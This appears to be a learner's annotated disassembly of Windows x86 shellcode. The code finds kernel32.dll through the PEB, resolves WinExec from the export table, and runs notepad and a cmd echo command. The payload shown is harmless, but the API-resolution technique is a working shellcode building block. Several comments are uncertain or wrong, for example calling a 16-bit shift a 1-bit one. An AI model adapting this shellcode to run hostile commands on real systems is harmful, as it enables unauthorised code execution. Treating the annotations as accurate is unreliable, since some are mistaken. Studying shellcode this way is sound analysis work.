Section 1: Establish a new stack frame

0x0061fc46:	31 c0                  		xor    %eax,%eax		       ; Set eax to zero
0x0061fc48:	64 8b 60 08            		mov    %fs:0x8(%eax),%esp	 ; Move Segment:Offset(base) to esp
0x0061fc4c:	8d 2c 24               		lea    (%esp),%ebp		     ; Load effective address specified by esp to ebp (Creates virtual stack)

Section 2: Find the kernel.dll base address

0x0061fc4f:	31 c0                  		xor    %eax,%eax		        ; EAX = 0
0x0061fc51:	64 8b 58 30            		mov    %fs:0x30(%eax),%ebx	; EBX = PEB(Process Environment Block) // using offset fs:0x30 (Segment:offset)
0x0061fc55:	8b 5b 0c               		mov    0xc(%ebx),%ebx		    ; EBX = PEB_LDR_DATA // using offset 0xc
0x0061fc58:	8b 5b 14               		mov    0x14(%ebx),%ebx		  ; EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
0x0061fc5b:	8b 1b                  		mov    (%ebx),%ebx	      	; EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
0x0061fc5d:	8b 1b                  		mov    (%ebx),%ebx		      ; EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
0x0061fc5f:	8b 43 10               		mov    0x10(%ebx),%eax	   	; EAX = base address of kernel32.dll // using offset 0x10 from EBX

Section 3: Find the function address of WinExec

0x0061fc62:	8b 50 3c               		mov    0x3c(%eax),%edx		  ; EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
0x0061fc65:	01 c2                  		add    %eax,%edx		        ; EDX = Address of PE signature = base address + RVA of PE signature

0x0061fc67:	31 db                  		xor    %ebx,%ebx		        ; EBX = 0
0x0061fc69:	b3 78                  		mov    $0x78,%bl		        ; EBX = 0x78
0x0061fc6b:	01 d3                  		add    %edx,%ebx		        ; EBX = RVA of Export Table = Address of PE + offset 0x78
0x0061fc6d:	8b 1b                  		mov    (%ebx),%ebx		      ; EBX is a pointer to a number // Move the value pointed to by EBX to EBX
0x0061fc6f:	01 c3                  		add    %eax,%ebx		        ; EBX = Address of Export Table = base address + RVA of export table

0x0061fc71:	8b 53 24               		mov    0x24(%ebx),%edx		  ; EDX = RVA of Ordinal Table = Address of Export Table + offset 0x24
0x0061fc74:	01 c2                  		add    %eax,%edx		        ; EDX = Address of Ordinal Table = base address + RVA of Ordinal Table

0x0061fc76:	53                     		push   %ebx			            ; Save current value of ebx in stack
0x0061fc77:	8b 5b 20               		mov    0x20(%ebx),%ebx		  ; EBX = RVA of Name Pointer Table = Address of Export Table + 0x20
0x0061fc7a:	01 c3                  		add    %eax,%ebx		        ; EBX = Address of Name Pointer Table = base address + RVA of Name Pointer Table

0x0061fc7c:	8b 0b                  		mov    (%ebx),%ecx		      ; ECX = Next list entry of Name Pointer Table ???????
0x0061fc7e:	8d 09                  		lea    (%ecx),%ecx		      ; Load effective address pointed to by ecx into ecx ??????
0x0061fc80:	01 c1                  		add    %eax,%ecx		        ; ECX = base address + address of next list entry
0x0061fc82:	8b 09                  		mov    (%ecx),%ecx		      ; Move the value pointed by ecx to ecx ???????
0x0061fc84:	81 f9 57 69 6e 45      		cmp    $0x456e6957,%ecx		  ; Compare the current value to Winexec
0x0061fc8a:	8d 5b 04               		lea    0x4(%ebx),%ebx		    ; EBX = Step ebx 4 steps up
0x0061fc8d:	8d 52 02               		lea    0x2(%edx),%edx		    ; EDX = Step edx 2 steps up
0x0061fc90:	75 ea                  		jne    0x61fc7c			        ; Jump to beginning of this block if comparison not equal
0x0061fc92:	4a                     		dec    %edx			            ; Decrement edx
0x0061fc93:	4a                     		dec    %edx			            ; Decrement edx
0x0061fc94:	8b 12                  		mov    (%edx),%edx		      ; Load contents at edx's new address
0x0061fc96:	c1 e2 10               		shl    $0x10,%edx		        ; Shift 1 bit to the left (multipy by 2)
0x0061fc99:	c1 ea 10               		shr    $0x10,%edx		        ; Shift 1 bit to the right (divide by 2)
0x0061fc9c:	5b                     		pop    %ebx			            ; Retain saved EBX value

0x0061fc9d:	8b 5b 1c               		mov    0x1c(%ebx),%ebx		; EBX = RVA of Adress Table = Address of Export Table
0x0061fca0:	01 c3                  		add    %eax,%ebx		      ; EBX = Address of Address Table = base address + RAV of Address Table
0x0061fca2:	01 d3                  		add    %edx,%ebx		      ; ..
0x0061fca4:	01 d3                  		add    %edx,%ebx		      ; ..
0x0061fca6:	01 d3                  		add    %edx,%ebx		      ; ..
0x0061fca8:	01 d3                  		add    %edx,%ebx		      ; Add edx to ebx 4 times ???????
0x0061fcaa:	8b 13                  		mov    (%ebx),%edx		    ; EDX = Content pointed to by ebx
0x0061fcac:	01 c2                  		add    %eax,%edx		      ;
0x0061fcae:	eb 22                  		jmp    0x61fcd2			      ; Jump to function call

Section 4: Start of Function

0x0061fcb0:	5b                     		pop    %ebx			          ; Retain saved EBX value -- What value ?????
0x0061fcb1:	89 d8                  		mov    %ebx,%eax		      ; Move it to EAX
0x0061fcb3:	04 09                  		add    $0x9,%al			      ; Add offset 0x9 to last 8 bits of EAX
0x0061fcb5:	31 c9                  		xor    %ecx,%ecx		      ; ECX = 0
0x0061fcb7:	88 08                  		mov    %cl,(%eax)		      ; Move last 8 bits of ECX to EAX (EAX = 0 ????? )
0x0061fcb9:	8d 40 2c               		lea    0x2c(%eax),%eax		; EAX = Effective address at eax + offset 0x2c
0x0061fcbc:	88 08                  		mov    %cl,(%eax)		      ; Move last 8 bits of ECX to EAX (EAX = 0 ????? )
0x0061fcbe:	8d 40 d5               		lea    -0x2b(%eax),%eax		; EAX = Effective address at EAX - offset 0x2b
0x0061fcc1:	52                     		push   %edx			          ; Save current EDX value onto stack
0x0061fcc2:	6a 05                  		push   $0x5			          ; Push 0x5
0x0061fcc4:	50                     		push   %eax			          ; Save current EAX value onto stack
0x0061fcc5:	ff d2                  		call   *%edx			        ; Call function pointed to by EDX
0x0061fcc7:	5a                     		pop    %edx			          ; Pop EDX from stack
0x0061fcc8:	6a 05                  		push   $0x5			          ; Push 0x5
0x0061fcca:	53                     		push   %ebx		          	; Save current EBX value onto stack
0x0061fccb:	ff d2                  		call   *%edx		         	; Call function pointed to by EDX

0x0061fccd:	e9 fb ff ff ff         		jmp    0x61fccd			      ; Jump here ?????????

0x0061fcd2:	e8 d9 ff ff ff         		call   0x61fcb0		      	;

Section: Passed Parameters

0x0061fcda:  6e 6f 74 65 70 61 64 20						                ; Pass as a command, Open/Create notepad file called f and write "Hello, You have a problem!"
0x0061fce2:  66 90 63 6d 64 20 2f 43
0x0061fcea:  20 22 65 63 68 6f 20 48
0x0061fcf2:  65 6c 6c 6f 2c 20 79 6f
0x0061fcfa:  75 20 68 61 76 65 20 61
0x0061fd02:  20 70 72 6f 62 6c 65 6d
0x0061fd0a:  21 20 3e 66 22
